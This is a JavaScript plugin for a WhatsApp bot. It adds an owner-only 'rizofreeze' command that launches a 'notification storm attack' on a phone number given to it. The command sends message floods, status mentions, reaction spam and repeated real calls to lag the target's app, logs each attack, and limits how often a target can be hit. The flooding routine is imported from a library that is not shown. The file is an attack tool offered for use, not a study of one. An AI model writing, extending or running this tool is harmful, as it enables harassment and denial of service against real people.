// plugins/rizofreeze.js
const { cmd } = require('../arslan');
const { Rizofreeze } = require('../lib/rizofreeze');

const fs = require('fs');
const path = require('path');
let userConfig = {};
try { userConfig = require('../config'); } catch (_) {}

function clean(v) {
    if (!v) return '';
    let r = String(v).trim();
    if (r.includes('@')) r = r.split('@')[0];
    if (r.includes(':')) r = r.split(':')[0];
    return r.replace(/[^0-9]/g, '');
}

const OWNERS = [
    ...(Array.isArray(userConfig.OWNER_NUMBERS) ? userConfig.OWNER_NUMBERS : []),
    userConfig.OWNER_NUMBER
].map(clean).filter(Boolean);

const STATE_FILE = path.join(__dirname, '..', 'rizofreeze_state.json');
const DEFAULTS = { protected: OWNERS, cooldownHours: 24, dailyLimit: 3, history: [], lastAt: 0 };

function loadState() {
    if (!fs.existsSync(STATE_FILE)) {
        try { fs.writeFileSync(STATE_FILE, JSON.stringify(DEFAULTS, null, 2)); } catch (_) {}
        return { ...DEFAULTS };
    }
    try { return { ...DEFAULTS, ...JSON.parse(fs.readFileSync(STATE_FILE, 'utf-8')) }; }
    catch (_) { return { ...DEFAULTS }; }
}
function saveState(s) {
    try { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); } catch (_) {}
}
function hoursSince(ts) { return (Date.now() - new Date(ts).getTime()) / 3600000; }

function checkTarget(target, botNum) {
    const s = loadState();
    if (target === botNum || (botNum && target.endsWith(botNum))) {
        return { ok: false, reason: 'SELF_PROTECT', msg: '🛡 Bot ka apna number target nahi.' };
    }
    if (s.protected.includes(target)) {
        return { ok: false, reason: 'PROTECTED', msg: '🛡 Ye number protected hai.' };
    }
    const last = [...s.history].reverse().find(h => h.target === target && h.status === 'success');
    if (last && hoursSince(last.ts) < s.cooldownHours) {
        const r = (s.cooldownHours - hoursSince(last.ts)).toFixed(1);
        return { ok: false, reason: 'COOLDOWN', msg: `⏳ ${r}h pehle hit hua.` };
    }
    const today = new Date().toISOString().slice(0, 10);
    const t = s.history.filter(h => h.status === 'success' && h.ts.startsWith(today)).length;
    if (t >= s.dailyLimit) {
        return { ok: false, reason: 'DAILY_LIMIT', msg: `📊 Aaj ka limit khatam.` };
    }
    return { ok: true };
}

function recordAttack(target, status) {
    const s = loadState();
    s.history.push({ target, ts: new Date().toISOString(), status });
    if (status === 'success') s.lastAt = Date.now();
    if (s.history.length > 500) s.history = s.history.slice(-500);
    saveState(s);
}

function botNumFrom(conn) {
    return String(conn.user?.id || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
}

cmd({
    pattern: 'rizofreeze',
    alias: ['rz', 'freeze', 'rizofz'],
    desc: 'RIZOFREEZE — notification storm attack (owner only)',
    category: 'owner',
    react: '🥶',
    filename: __filename,
    owner: true
},
async (conn, mek, m, { from, args, isCreator, reply }) => {
    try {
        if (!isCreator) return reply('🔒 *Owner Only*');

        if (!args[0]) {
            return reply(
`🥶 *RIZOFREEZE — Notification Storm*

📌 *Usage:* .rizofreeze <number> [mode]

📖 *Modes:*
• \`text\` — 60 text messages flood
• \`status\` — 15 status mentions
• \`reaction\` — 25 reaction spam
• \`call\` — 8 real calls (via Xeon API)
• \`all\` — all vectors (default, MAX STORM)

📖 *Examples:*
.rizofreeze 923001234567 all
.rizofreeze 923001234567 call

🔥 Notification overload → temporary app lag
⏳ 24h cooldown | 3/day`
            );
        }

        const num = String(args[0]).replace(/[^0-9]/g, '');
        if (!num || num.length < 10) return reply('❌ *Invalid number!*');

        const mode = (args[1] || 'all').toLowerCase();

        const check = checkTarget(num, botNumFrom(conn));
        if (!check.ok) return reply(`${check.msg}\n\n🚫 \`${num}\`\n📋 ${check.reason}`);

        await reply(
`🥶 *RIZOFREEZE LOCKED*
🎯 Target : \`${num}\`
💥 Mode   : ${mode}
🧬 Vectors: text + status + reaction + call
🔇 Silent  : ON
⚡ Launching...`
        );

        let lastPct = 0;
        const result = await Rizofreeze(conn, num, mode, (sent, total, type) => {
            const pct = total > 0 ? Math.floor((sent / total) * 100) : 0;
            if (pct >= lastPct + 20) {
                lastPct = pct;
                conn.sendMessage(from, { text: `⏳ ${pct}% — *${type}* (${sent}/${total})` }).catch(() => {});
            }
        });

        if (result.ok) {
            recordAttack(num, 'success');
            await conn.sendMessage(from, { react: { text: '🥶', key: mek.key } });
            return reply(
`✅ *RIZOFREEZE COMPLETE*
🎯 Target : \`${num}\`
📤 Sent   : \`${result.sent}\` actions
❌ Errors : \`${result.errors}\` (${result.errorRate})
🧬 Vectors: ${result.vectors?.join(' + ') || mode}
🕒 ${new Date().toLocaleString()}`
            );
        } else {
            recordAttack(num, 'failed');
            return reply(`⚠️ *Failed*`);
        }
    } catch (err) {
        return reply(`❌ ${err.message}`);
    }
});